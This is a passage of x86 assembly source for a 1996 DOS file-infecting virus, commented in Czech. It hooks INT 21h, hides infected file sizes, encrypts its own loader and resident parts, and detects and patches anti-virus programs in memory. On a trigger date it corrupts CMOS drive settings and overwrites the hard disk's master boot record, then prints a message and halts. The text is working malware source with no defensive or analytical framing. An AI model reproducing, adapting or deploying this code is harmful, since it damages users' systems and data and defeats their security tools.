	LOOP	CODTSR				; zakoduj rezident

	MOV	ah,40h
	MOV	cx,WORD PTR cs:[0002]
	XOR	dx,dx
	CLI
	PUSHF
	CALL	DWORD PTR cs:[0005]
	STI
	PUSHF					; zapis telo viru

	MOV	di,272				;	LINECHANGE 241
	MOV	cx,2809				; velikost rezidentu LINECH 2730
	MOV	al,BYTE PTR cs:[0237]
DEKTSR:	XOR	BYTE PTR [di],al
	INC	di
	LOOP	DEKTSR				; dekod rezident

	POPF
	POP	ax
	PUSHF
	ADD	ax,4
	JMP	ax				; navrat na rezident

XXX1:	PUSH	es
	POP	ds
	POP	si
	MOV	di,WORD PTR cs:[0002]
	ADD	di,220
	PUSH	di
	MOV	cx,29
	REP	MOVSW
	POP	ax
	CALL	XXX2
XXX2:	PUSH	es
	POP	ds
	JMP	ax				; "zavolej" externi funkci

	CALL	UData
	POPF
	JNC	QW
	POP	cx
	JMP	OldDT
QW:	INC	WORD PTR cs:[0110]
	ADC	WORD PTR cs:[0112],0
	RETN					; zapis vir nakonec

Back:	MOV	ax,4200h
	XOR	cx,cx
	XOR	dx,dx
	CALL	I21h
	RETN					; SEEK nazacatek souboru

Down:	MOV	ax,4202h
	XOR	cx,cx
	XOR	dx,dx
	CALL	I21h
	RETN					; SEEK nakonec

S1387:	MOV	ax,4200h
	XOR	cx,cx
	MOV	dx,1387h
	CALL	I21h
	RETN					; SEEK 1387

Sb256:	MOV	ax,4201h
	XOR	cx,cx
	MOV	dh,BYTE PTR cs:[0036]
	XOR	dl,dl
	CALL	I21h
	RETN					; SEEK 256

F_FindA:PUSH	ax
	CALL	SveAll				; uloz registry

	MOV	si,dx
	PUSH	cs
	POP	es
	MOV	di,WORD PTR cs:[0002]
	ADD	di,126
	MOV	cx,40
	PUSH	di
	REP	MOVSW				; COPY ASCIIZ TO MEM

	CLD
	POP	di
	PUSH	di
	MOV	al,0
	MOV	cx,80
	REPNE	SCASB				; SEARCH FOR ZERO BYTE

	STD
	POP	dx
	MOV	al,'\'
	MOV	cx,di
	SUB	cx,dx
	DEC	di
	REPNE	SCASB				; SEARCH FOR '\'

	JCXZ	NZF
	INC	di
NZF:	INC	di
	MOV	WORD PTR cs:[0052],di		; FILENAME OFFSET

	CALL	LodAll
	POP	ax				; obnov registry

F_FindB:POPF
	CALL	I21h
	PUSHF
	JC	QCF1				; zavolej funkci 4Eh,4Fh / 21h

	PUSH	ax
	CALL	SveAll				; uloz registry

	MOV	ah,2Fh
	CALL	I21h				; nacti DTA (@ES:BX)

	MOV	di,bx
	ADD	di,1Eh
	CLD
	MOV	cx,13
	MOV	al,0
	REPNE	SCASB
	SUB	di,4
	CALL	ESDICE
	JC	Fi1
	JMP	SHORT QNCE			; je soubor COM,EXE nebo jiny ?

Fi1:	MOV	ax,es:[bx+1Ch]
	CMP	ax,0
	JNE	Fi2
	CMP	es:[bx+1Ah],10000
	JB	QNCE				; je soubor > 10000

Fi2:	PUSH	es
	PUSH	bx				; uloz DTA

	PUSH	es
	POP	ds
	PUSH	bx
	POP	si
	ADD	si,1Eh
	PUSH	cs
	POP	es
	MOV	di,WORD PTR cs:[0052]
	MOV	cx,7
	REP	MOVSW				; COPY FILENAME TO MEM

	MOV	ax,3D00h
	PUSH	cs
	POP	ds
	MOV	dx,WORD PTR cs:[0002]
	ADD	dx,126
	CALL	I21h
	JC	QOUFB
	MOV	bx,ax				; BX = File Handle

	CALL	TSTINF
	POP	di
	POP	es
	JNC	NotI				; je soubor napaden ?

	SUB	si,6
	SUB	WORD PTR es:[di+1Ah],si
	SBB	WORD PTR es:[di+1Ch],0		; "zmensi" velikost

NotI:	MOV	ah,3Eh
	CALL	I21h				; zavri soubor

QNCE:	CALL	LodAll
	POP	ax				; obnov registry

QFF:	POPF
	RETF	2				; skonci

QOUFB:	POP	ax
	POP	ax
	JMP	SHORT QNCE			; skonci

QCF1:	PUSH	di
	MOV	di,126
	ADD	di,WORD PTR cs:[0002]
	MOV	WORD PTR cs:[0052],di
	POP	di
	JMP	SHORT QFF			; ReSet FILENAME OFFSET

F_FFCB:	POPF
	CALL	I21h
	PUSHF
	CMP	al,0
	JE	Cnt1
	JMP	QFFx				; zavolej funkci 11h,12h / 21h

Cnt1:	PUSH	ax
	CALL	SveAll				; uloz registry

	MOV	ah,2Fh
	CALL	I21h				; nacti DTA (@ES:BX)

	CMP	BYTE PTR es:[bx],0FFh
	JNE	NoExp
	ADD	bx,7				; EXPANDED FCB SIGNATURE

NoExp:	INC	bx
	MOV	cx,4
	MOV	di,WORD PTR cs:[0002]
	PUSH	es
	POP	ds
	PUSH	cs
	POP	es
	PUSH	bx
	POP	si
	CLD
	PUSH	di
	REP	MOVSW				; COPY FILENAME TO MEM

	POP	di
	MOV	al,20h
	MOV	cx,9
	REPNE	SCASB				; SEARCH FOR 20h IN FILENAME

	MOV	BYTE PTR es:[di-1],'.'		; PUT '.'

	MOV	si,bx
	ADD	si,8
	MOV	cx,2
	PUSH	di
	REP	MOVSW				; COPY EXTENSION TO MEMORY

	POP	di
	CALL	ESDICE
	JC	EC2
	JMP	SHORT NIF			; je soubor COM,EXE nebo jiny ?

EC2:	MOV	BYTE PTR es:[di+3],0		; PUT ZERO BYTE

	PUSH	ds
	POP	es
	MOV	di,bx
	PUSH	cs
	POP	ds
	MOV	dx,WORD PTR cs:[0002]
	MOV	ax,3D02h
	CALL	I21h
	JC	NIF				; otevri soubor

	MOV	bx,ax
	PUSH	ax
	PUSH	es	
	PUSH	di	
	CALL	TSTINF
	POP	di	
	POP	es	
	JNC	NIFC				; je soubor napaden ?

	SUB	si,6
	SUB	WORD PTR es:[di+1Ch],si
	SBB	WORD PTR es:[di+1Eh],0		; "zmensi" velikost

NIFC:	POP	bx
	MOV	ah,3Eh
	CALL	I21h				; zavri soubor

NIF:	CALL	LodAll
	POP	ax				; obnov registry

QFFx:	POPF
	RETF	2				; skonci

CteHo:	CMP	si,di
	JA	NeCte
	CMP	WORD PTR cs:[0054],di
	JB	NeCte
	STC
	RETN
NeCte:	CLC
	RETN					; cte urceny BYT ?

RepHo:	PUSH	bx
	MOV	bx,WORD PTR cs:[0050]
	ADD	bx,di
	SUB	bx,si
	MOV	BYTE PTR ds:[bx],cl
	POP	bx
	RETN					; nahrad tento BYT

Decode3:PUSH	ax
	CALL	SveAll
	MOV	si,9
	PUSH	si
	PUSH	cs
	POP	es
	PUSH	es
	POP	ds
	POP	di
	MOV	cx,24
DecL2:	LODSB
	NOT	al
	STOSB
	LOOP	DecL2
	CALL	LodAll
	POP	ax
	RETN					; dekoduj cast programu

XR:	PUSH	dx
	PUSH	ds
	PUSH	si
	XOR	dx,dx
	MOV	ds,dx
_Again:	MOV	si,046Ch
	LODSW
	CMP	al,0
	JE	_Again
	CMP	ah,0
	JE	_Again
	POP	si
	POP	ds
	POP	dx
	RETN					; AX (AH,AL) RND#

; *****************************************************************************
; VIRUS - COMMON PROCEDURES
; *****************************************************************************
FLUMB:	MOV	ax,9FFFh
	MOV	es,ax
	CMP	BYTE PTR es:[0000],0
	JE	NotAv
TUMB:	CLC
	JNC	UccA2
AccA2	DB	3
UccA2:	CMP	BYTE PTR es:[0000],'Z'
	JNE	NoLast
	STC
	RETN
NoLast:	INC	ax
	ADD	ax,es:[0003]
	PUSH	ax
	POP	es
	JMP	TUMB
NotAv:	CLC
	RETN					; najdi posledni UMB blok

SveAll:	PUSH	es
	POP	ax
	POP	ax
	PUSH	bx
	PUSH	cx
	PUSH	dx
	PUSH	si
	PUSH	di
	PUSH	ds
	PUSH	es
	PUSH	bp
	JMP	ax				; ulozi vse (krome AX)

LodAll:	PUSH	ds
	POP	ax
	POP	ax
	POP	bp
	POP	es
	POP	ds
	POP	di
	POP	si
	POP	dx
	POP	cx
	POP	bx
	JMP	ax				; obnovi vse (krome AX)

Decode:	PUSH	si
	POP	bx
Decode2:ADD	bx,ax
DecL:	XOR	[bx],dx
	INC	bx
	XCHG	dh,dl
	INC	bx
	LOOP	DecL
	RETN					; dekoduj cast programu

EndINT	DW	$-BegINT+2

; *****************************************************************************
; VIRUS - CODE
; *****************************************************************************
First:	LAHF
	MOV	bx,0E000h
	LAHF
	MOV	cx,653				; velikost zavadece
	LAHF
UnLock:	XOR	WORD PTR cs:[bx],01234h
	LAHF
	INC	bx
	LAHF
	INC	bx
	LAHF
	LOOP	UnLock				; dekoduj zavadec

	CALL	GetOfs				; CALL - tak takhle to zacalo

GetOfs:	CALL	Go				; takhle to pokracovalo

Go:	PUSH	sp
	POP	ax
	INC	ax
	INC	ax
	PUSH	ax
	JNZ	UccE
AccE	DB	5
UccE:	POP	sp
	POP	si
	SUB	si,24
	MOV	di,si
	PUSH	es
	PUSH	cs
	POP	ds
	SUB	si,[si-2]
	SUB	si,[si-2]
	SUB	di,si
	MOV	BYTE PTR cs:[si+103],0
	MOV	[si],di				; ziskani ofsetu (SI)

	MOV	ah,2Ch
	CLD
	INT	21h
	MOV	bx,dx
 	MOV	cx,16384
TLoop:	JCXZ	QLoop
	LOOP	TLoop
QLoop:	INT	21h
	MOV	al,ah
	PUSH	ss
	CMP	bx,dx
	JZ	Dale
	NOT	BYTE PTR [si+103]
	JMP	REnd				; test heuristiky (AVG,F-PROT)

Dale:	PUSH	cx
	MOV	ah,69h
	JNC	OKTS
AccU1	DB	1
OKTS:	INT	21h
	POP	ax
	PUSH	cx
	MOV	cl,al
	ROL	ax,cl
	NOT	ax
	POP	cx
	CMP	ax,cx
	JNE	Dale1
C$07P:	JMP	REnd				; test viru v pameti

Dale1:	MOV	cx,78
	MOV	al,BYTE PTR [si+237]
	MOV	di,[si]
	ADD	di,si
	SUB	di,cx
	SUB	di,2
DEKCP:	XOR	BYTE PTR [di],al
	INC	di
	LOOP	DEKCP				; dekoduj COMM.PROC.

	MOV	ax,68
	MOV	cx,83
	MOV	dx,[si+43]
	CALL	Decode				; dekoduj data viru

	PUSH	ds
	MOV	bl,3
	PUSH	si
	PUSH	sp
	MOV	ax,6900h
	POP	dx
	PUSH	ss
	SUB	dx,1024
	POP	ds
	PUSH	dx
	INT	21h
	MOV	di,si
	POP	si
	PUSH	cs
	POP	es
	ADD	di,230
	ADD	si,6
	MOV	cx,5
	REP	CMPSB
	JZ	QuitL
	POP	si
	POP	ds
	JMP	SHORT Dale2
QuitL:	POP	si
	POP	ds
	JMP	SHORT C$07P			; test LABELu disku

Dale2:	MOV	al,9
	CALL	ReCMOS
	CMP	cl,97h
	JE	NoTime
	MOV	al,7
	CALL	ReCMOS
	MOV	dl,cl
	MOV	al,8
	CALL	ReCMOS
	MOV	dh,cl
	XOR	dx,0904h
	CMP	dx,0815h
	JNE	NoTime
	JMP	ThisIs				; aktivacni syst. 11.Ledna > 97

NoTime:	MOV	ah,30h
	INT	21h
	CMP	al,4
	JNB	VerOK
	JMP	REnd				; test verze MSDOSu

AccU2	DB	1

VerOK:	MOV	ah,0DCh
	INT	21h
	CMP	al,0
	JE	NoNET
	JMP	REnd				; test NET ENVIRONMENT

NoNET:	PUSH	ds
	MOV	ah,52h
	INT	21h
	MOV	es,WORD PTR es:[bx-2]
	MOV	ax,es
TMem:	CLC
	JNC	UccA3
AccA3	DB	3
UccA3:	CMP	BYTE PTR es:[0000],'Z'
	JNE	FAlrm
	JMP	QMem
FAlrm:	CMP	WORD PTR es:[0008h],'DS'
	JNE	NoSyDa
	CMP	WORD PTR es:[000Ah],0
	JNE	NoSyDa
	INC	ax
	PUSH	ax
	POP	es
	JMP	SHORT FAlrm
NoSyDa:	PUSH	ax
	CALL	SveAll
	MOV	bp,154
	CALL	JETAM
	JNC	Anti2
	MOV	bp,97
	CALL	DAV
Anti2:	MOV	bp,159
	CALL	JETAM
	JNC	Anti3
	MOV	bp,114
	CALL	DAV
Anti3:	MOV	bp,164
	CALL	JETAM
	JNC	Anti4
	MOV	bp,120
	CALL	DAV
Anti4:	MOV	bp,169
	CALL	JETAM
	JNC	Anti5
	MOV	bp,194
	CALL	DAV
Anti5:	MOV	bp,174
	CALL	JETAM
	JNC	Anti6
	MOV	bp,200
	CALL	DAV
Anti6:	MOV	bp,179
	CALL	JETAM
	JNC	Anti7
	MOV	bp,206
	CALL	DAV
Anti7:	MOV	bp,184
	CALL	JETAM
	JNC	Anti8
	MOV	bp,212
	CALL	DAV
Anti8:	MOV	bp,189
	CALL	JETAM
	JNC	NoAnti
	MOV	bp,218
	CALL	DAV
NoAnti:	CALL	LodAll
	POP	ax
Noth:	ADD	ax,WORD PTR es:[0003]
	INC	ax
	PUSH	ax
	POP	es
	JMP	TMem
QMem:	POP	ds
	PUSH	ds
	POP	es				; test antiviru v pameti

	MOV	ax,[si+2]
	MOV	cl,4
	SHR	ax,cl
	ADD	ax,19
	MOV	BYTE PTR [si+4],al
	MOV	BYTE PTR [si+105],ah
	MOV	dx,ax				; prepocteni pameti na paragr.

	MOV	ah,62h
	INT	21h
	PUSH	bx				; PSP = BX

	MOV	ax,3521h
	JNC	UccM1
AccM1	DB	0
UccM1:	INT	21h
	MOV	[si+5],bx
	MOV	[si+7],es			; ulozeni puvodni obsluhy 21h

	MOV	BYTE PTR cs:[si+104],1
	CALL	FLUMB
	POP	ax
	JC	All3
	NOT	BYTE PTR cs:[si+104]		; je volno v UMB ?

	DEC	ax
	MOV	es,ax
	MOV	cx,ax
	JNC	UccA4
AccA4	DB	3
UccA4:	CMP	BYTE PTR es:[0000],'Z'
	JE	All3				; je aktualni MCB blok posledni

	MOV	ah,48h
	MOV	bx,0FFFFh
	INT	21h
	CMP	bx,dx
	JA	All1
	JMP	REnd				; kontrola dostupne pameti

All1:	MOV	ah,48h
	INT	21h				; alokuji vsechnu volnou pamet

	DEC	ax
	MOV	es,ax
	MOV	WORD PTR es:[0001],0
	CLC
	JNC	UccA5
AccA5	DB	3
UccA5:	CMP	BYTE PTR es:[0000],'Z'
	JE	All2
	JMP	REnd				; je novy blok opravdu posledni

All2:	ADD	ax,es:[0003]
	INC	ax
	MOV	es:[0012h],ax			; upraveni vel. dostupne pameti

All3:	MOV	ax,es:[0003]
	SUB	ax,dx
	JNC	All4
	JMP	REnd				; kontrola vel. bloku pameti

AccA6	DB	3

All4:	MOV	WORD PTR es:[0003],ax
	CMP	BYTE PTR cs:[si+104],0FEh
	JE	NoUMB
	MOV	cx,es
	ADD	cx,ax
	PUSH	cx
	POP	es
	JMP	SHORT Inst
NoUMB:	SUB	WORD PTR es:[0012h],dx
	MOV	es,es:[0012h]			; ES = segment viru v pameti

Inst:	PUSH	si
	MOV	cx,[si+2]
	INC	cx
	SHR	cx,1
	XOR	di,di
	REP	MOVSW				; instalace viru do pameti

	PUSH	ds
	XOR	dx,dx
	MOV	ds,dx
	MOV	si,046Ch
	LODSW
	POP	ds
	POP	si
	ADD	ax,[si+43]
	MOV	WORD PTR es:[0235],ax
	MOV	di,[si]
	ADD	di,21
	MOV	cx,653				; velikost zavadece
KODZAV:	XOR	WORD PTR es:[di],ax
	INC	di
	INC	di
	LOOP	KODZAV				; zakodovani zavadece v pameti

	MOV	al,BYTE PTR cs:[si+237]
	MOV	di,272				;	LINECHANGE 241
	MOV	cx,2809-78 ; LINECH 2809-78-79	; vel. rezidentu - COMM.PROC.
DEKREZ:	XOR	BYTE PTR es:[di],al
	INC	di
	LOOP	DEKREZ				; dekodovani rezidentni casti

	PUSH	ds
	PUSH	es
	POP	ds
	MOV	dx,272				;	LINECHANGE 241
	MOV	ax,2521h
	JNC	UccM2
AccM2	DB	3
UccM2:	INT	21h
	POP	ds				; styk viru s okolim (INT 21h)

REnd:	PUSH	si
	ADD	si,9
	PUSH	si
	PUSH	ds
	POP	es
	POP	di
	MOV	cx,24
Dek:	LODSB
	NOT	al
	STOSB
	LOOP	Dek
	POP	si
	POP	ss
	POP	ds
	PUSH	ds
	POP	es
	CLC
	JNC	UccZ
AccZ	DB	3
UccZ:	CMP	WORD PTR cs:[si+9],'ZM'
	JE	RE2
	PUSH	cs
	ADD	si,9
	MOV	cx,3
	MOV	di,0100h
	PUSH	di
	CLC
	JNC	UccO
AccO	DB	5
UccO:	REP	MOVSB
	SUB	si,12
	CMP	BYTE PTR cs:[si+103],0
	JE	OkZ1
	MOV	BYTE PTR cs:[00FFh],90h
	POP	di
	DEC	di
	PUSH	di
OkZ1:	MOV	bx,1487h
	JMP	RE3
RE2:	CLI
	MOV	sp,WORD PTR cs:[si+25]
	MOV	ax,WORD PTR cs:[si+23]
	MOV	bx,ds
	ADD	ax,bx
	ADD	ax,10h
	MOV	ss,ax
	STI
	MOV	ax,WORD PTR cs:[si+31]
	MOV	bx,ds
	ADD	ax,bx
	ADD	ax,10h
	PUSH	ax
	PUSH	WORD PTR cs:[si+29]
	CMP	BYTE PTR cs:[si+103],0
	JE	OkZ2
	POP	bx
	POP	ds
	DEC	bx
	MOV	BYTE PTR ds:[bx],90h
	PUSH	ds
	PUSH	bx
OkZ2:	MOV	bx,1487h
	MOV	ax,WORD PTR cs:[si+37]
	SUB	bx,ax
RE3:	MOV	al,BYTE PTR cs:[si+33]
	MOV	BYTE PTR es:[bx],al
	MOV	ah,BYTE PTR cs:[si+36]
	XOR	al,al
	ADD	bx,ax
	INC	bx
	MOV	ax,WORD PTR cs:[si+34]
	MOV	WORD PTR es:[bx],ax
	XOR	ax,ax
	XOR	bx,bx
	XOR	cx,cx
	XOR	dx,dx
	XOR	si,si
	XOR	di,di
	XOR	bp,bp
	SAHF
	RETF					; skok na puvodni program ...

JETAM:	PUSH	si
	ADD	si,bp
	MOV	cx,5
	MOV	di,8
	REPE	CMPSB
	POP	si
	JCXZ	Je0
	CLC
	RETN
Je0:	STC
	RETN					; je tam ? (retezec v pameti)

DAV:	MOV	BYTE PTR cs:[si+224],0
	CALL	SveAll
	PUSH	es
	POP	cx
	ADD	cx,11
	PUSH	cx
	XOR	di,di
	MOV	dx,WORD PTR es:[0003]
	MOV	cl,4
	SHL	dx,cl
	MOV	cx,dx
	POP	es				; nastav ES:DI na zacatek prg.

	CMP	bp,212
	JNE	FFCH
	PUSH	es
	POP	ax
	SUB	ax,10
	PUSH	ax
	POP	es				; uprav ES pro VSAFE

FFCH:	PUSH	si
	ADD	si,bp
	LODSB
	REPNE	SCASB
	POP	si
	JCXZ	QDAV				; FindFirstCharacter

	PUSH	cx
	PUSH	di
	PUSH	si				; uloz registry

	MOV	WORD PTR cs:[si+215],es		; uprav VSAFE ID String

	ADD	si,bp
	INC	si
	MOV	cx,5
	REPE	CMPSB
	CLC
	JCXZ	Found
	JMP	SHORT DidnF
Found:	STC					; shoduje se s ID retezcem ?

DidnF:	POP	si
	POP	di
	POP	cx				; obnov registry

	JNC	FFCH				; neshoduje, hledej dal

	NOT	BYTE PTR cs:[si+224]		; byl nalezen ID retezec

	DEC	di				; di na prvni character

	CMP	bp,97
	JNE	ND_AVGS
	MOV	cx,4
	MOV	ax,9090h
	REP	STOSW				; DESTROY INSTRUCTIONS

ND_AVGS:CMP	bp,114
	JNE	ND_FGUA
	CALL	DT1				; DESTROY INSTRUCTIONS

ND_FGUA:CMP	bp,120
	JNE	ND_TBCH
	CALL	DT1				; DESTROY INSTRUCTIONS

ND_TBCH:CMP	bp,194
	JNE	ND_TBFI
	CALL	DT1				; DESTROY INSTRUCTIONS

ND_TBFI:CMP	bp,200
	JNE	ND_TBME
	CALL	DT1				; DESTROY INSTRUCTIONS

ND_TBME:CMP	bp,206
	JNE	ND_VMON
	CALL	DT2				; DESTROY INSTRUCTIONS

ND_VMON:CMP	bp,212
	JNE	ND_VSAF
	MOV	cx,5
	ADD	si,225
	REP	MOVSB				; DESTROY INSTRUCTIONS

ND_VSAF:CMP	bp,218
	JNE	QDAV
	CALL	DT2				; DESTROY INSTRUCTIONS

QDAV:	CALL	LodAll
	CMP	BYTE PTR cs:[si+224],0
	JNE	DD_Ok
	POP	ax
	CALL	LodAll
	POP	ax
	POP	ds
	JMP	REnd
DD_Ok:	RETN					; skonci

DT1:	INC	di
	INC	di
	INC	di
	MOV	al,0EBh
	STOSB
	RETN					; DESTROY INSTRUCTIONS #1

DT2:	MOV	cx,5
	MOV	al,90h
	REP	STOSB
	RETN					; DESTROY INSTRUCTIONS #2

ThisIs:	MOV	dx,0000h			;	LINECHANGE 0080h
	MOV	cx,1
	CALL	TR0				; zapis se do MBR

_BX_:	JMP	RunMe				; Run Me

WrCMOS:	OUT	70h,al
	JMP	$+2
	MOV	al,cl
	OUT	71h,al
	RETN					; zapis do CMOS (cl -> al)

ReCMOS:	OUT	70h,al
	JMP	$+2
	IN	al,71h
	MOV	cl,al
	RETN					; cti z CMOS (cl <- al)

RunMe:	MOV	al,10h
	CALL	ReCMOS
	MOV	bl,cl
	XOR	bh,bh				; BX - puvodni typy mechanik

	MOV	al,10h
	MOV	cl,0
	CALL	WrCMOS				; oznac nove typy mechanik

	MOV	al,2Eh
	CALL	ReCMOS
	MOV	dh,cl
	MOV	al,2Fh
	CALL	ReCMOS
	MOV	dl,cl				; DX - puvodni CRC

	SUB	dx,bx				; DX - nove CRC

	MOV	al,2Eh
	MOV	cl,dh
	CALL	WrCMOS
	MOV	al,2Fh
	MOV	cl,dl
	CALL	WrCMOS				; zapis nove CRC

	XOR	ax,ax
	INT	10h				; nastav videorezim 0

	CALL	XXX
Message	DB	0A5h,0A6h,0ADh,0ABh,0BAh,0BCh,0DFh,090h,091h,0DFh,09Dh,090h
	DB	09Eh,08Dh,09Bh,0F5h,0F2h,0B7h,0BEh,0ADh,0BBh,0A8h,0BEh,0ADh
	DB	0BAh,0DFh,0BAh,0ADh,0ADh,0B0h,0ADh
						; message #1

	DB	'Zyrtec still live in my body. '
	DB	'I am 16 so you must love me. '
	DB	'I don',39,'t wanna live in this bad world without friends.'
						; message #2

XXX:	PUSH	cs
	POP	ds
	POP	si
	MOV	ah,0Eh
Next:	LODSB
	CMP	al,90
	JE	Spadni
	NOT	al
	XOR	cx,cx
	XOR	bx,bx
	INT	10h
	JMP	SHORT Next			; vypis zpravu

Spadni:	CLI
	HLT					; konec zivota

TR0:	PUSH	cs
	POP	es
	POP	bx
Again:	MOV	ax,0301h
	JNC	UccD
AccD	DB	3
UccD:	INT	13h
	JC	Again
	JMP	_BX_				; zapis program do MBR

A	ENDS
	END	START

P.S.:	udaje pro XOR :
	velikost rezidentni casti	2809 BYTE
	velikost zavadece 		653  WORD
							     14:24pm 12-12-1996
